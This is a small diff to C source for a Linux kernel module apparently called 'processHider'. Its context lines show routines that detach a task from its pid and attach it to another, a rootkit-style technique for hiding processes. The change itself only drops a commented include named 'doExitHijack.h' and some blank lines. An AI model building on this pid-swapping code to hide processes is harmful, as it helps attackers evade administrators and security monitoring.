@@ -10,10 +10,6 @@
 	#error "this module requires config profiling enabled"
 #endif
 
-
-//#include "doExitHijack.h"
-
-
 // prototypes for functions from pid.c
 
 static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type, struct pid *new);
@@ -70,6 +66,7 @@ int processHider_init(void) {
 	if (error != 0) { //todo : extract function..
 		return error;
 	}
+
 	return 0;
 }
 
@@ -128,9 +125,6 @@ void attach_pid(struct task_struct *task, enum pid_type type,
 	hlist_add_head_rcu(&link->node, &pid->tasks[type]);
 }
 
-
-
-
 static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
 			struct pid *new)
 {
@@ -168,4 +162,3 @@ struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
 	attach_pid(task, type, pid);
 	return oldPid;
 }
-
